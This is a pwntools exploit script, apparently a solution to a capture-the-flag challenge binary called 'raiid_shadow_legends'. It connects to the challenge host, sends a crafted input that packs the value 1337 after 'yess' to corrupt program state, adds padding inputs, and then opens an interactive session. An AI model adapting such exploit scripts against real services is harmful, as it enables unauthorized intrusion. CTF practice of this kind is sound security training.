#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host shell.actf.co --port 21300 ./raiid_shadow_legends
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./raiid_shadow_legends')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 21300)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv,aslr=0, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x00005555555556e9
b *0x0000555555555291
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()


p = '1'
io.sendlineafter("do? ",p)

p = 'yess'
p+= p64(1337)
io.sendlineafter("terms and conditions? ",p)
p = 'yes'
io.sendlineafter("terms and conditions? ",p)

p = 'c'*64
io.sendlineafter("here: ",p)

p = 'd'*128
io.sendlineafter("name: ",p)

p = '2'
io.sendlineafter("do? ",p)
# p = '1'
# io.sendlineafter("do? ",p)
#
# p = 'yes'
# io.sendlineafter("terms and conditions? ",p)
# p = 'E'*64
# io.sendlineafter("here: ",p)
#
# p = 'D'*128
# io.sendlineafter("name: ",p)

io.interactive()
